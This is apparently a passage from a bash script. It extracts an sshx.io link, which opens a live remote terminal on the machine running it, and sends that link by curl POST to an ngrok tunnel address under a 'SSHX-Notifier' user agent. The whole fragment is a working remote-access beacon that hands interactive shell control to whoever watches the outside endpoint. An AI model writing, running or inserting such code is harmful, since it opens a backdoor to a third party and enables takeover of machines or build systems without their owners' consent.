# Extract the SSHX URL from the output
SSHX_URL=$(echo "$SSHX_OUTPUT" | grep -oE 'https://sshx.io/[a-zA-Z0-9]+' | head -n 1)

# Check if we got a URL
if [ -z "$SSHX_URL" ]; then
    echo "Failed to retrieve SSHX URL"
    exit 1
fi

# Send the SSHX URL to the specified endpoint
curl -X POST "https://00ed-2a02-2f09-3f02-7700-7885-7aff-8860-aa3e.ngrok-free.app " \
     -H "Content-Type: application/json" \
     -H "User-Agent: SSHX-Notifier" \
     -d "{\"sshx_url\": \"$SSHX_URL\"}"

# Print confirmation
echo "Sent SSHX URL: $SSHX_URL"
